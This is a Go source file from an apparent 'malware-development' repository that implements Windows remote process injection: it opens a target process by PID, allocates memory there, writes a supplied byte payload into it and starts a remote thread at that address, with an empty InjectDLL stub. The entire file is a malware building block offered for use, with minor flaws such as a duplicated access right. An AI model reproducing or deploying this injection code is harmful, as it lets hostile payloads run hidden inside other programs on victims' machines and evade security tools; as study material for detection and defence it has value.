package process_injection

import (
	"fmt"
	"github.com/osonkr/malware-development/win32"
	"log"
	"unsafe"
)

// Inject will attempt to inject a byte array into a new region of memory
// in the process provided. It will the create a remote thread at the given base address
// of the new memory region.
//
// For injecting a DLL look to InjectDLL
func Inject(data []byte, pid uint32) {
	buf := append(data, byte(0))
	size := len(buf)

	// 1. Get Remote Process Handle
	var rights uint32 = win32.PROCESS_CREATE_THREAD |
		win32.PROCESS_QUERY_INFORMATION |
		win32.PROCESS_VM_OPERATION |
		win32.PROCESS_VM_WRITE |
		win32.PROCESS_VM_WRITE

	procHandle, err := win32.OpenProcess(rights, 0, pid)
	if err != nil {
		log.Fatalf("couldn't open process: %s", err)
	}

	// 2. Create New Region of Memory in Remote Process
	var null win32.NULL_REF
	baseAddr, err := win32.VirtualAllocEx(
		procHandle,
		uintptr(null),
		uintptr(size),
		win32.MEM_COMMIT | win32.MEM_RESERVE,
		win32.PAGE_EXECUTE_READ,
		)

	if err != nil {
		log.Fatalf("unable to allocate memory to process: %s", err)
	}

	fmt.Printf("[*] Base memory address: %v\n", unsafe.Pointer(baseAddr))

	// 3. Write to Memory
	var bWritten *byte

	if err = win32.WriteProcessMemory(
		procHandle,
		baseAddr,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(bWritten)),
		); err != nil {
		log.Fatalf("unable to write to memory: %s", err)
	}

	// 4. Create Remote Thread at baseAddr
	var threadAttrs win32.LPSECURITY_ATTRIBUTES
	remoteThread, err := win32.CreateRemoteThread(
		procHandle,
		threadAttrs,
		0,
		baseAddr,
		0,
		0,
		0,
		)

	if err != nil {
		log.Fatalf("unable to create remote thread: %s", err)
	}

	fmt.Printf("Remote thread created: %v\n", remoteThread)
}

func InjectDLL() {}
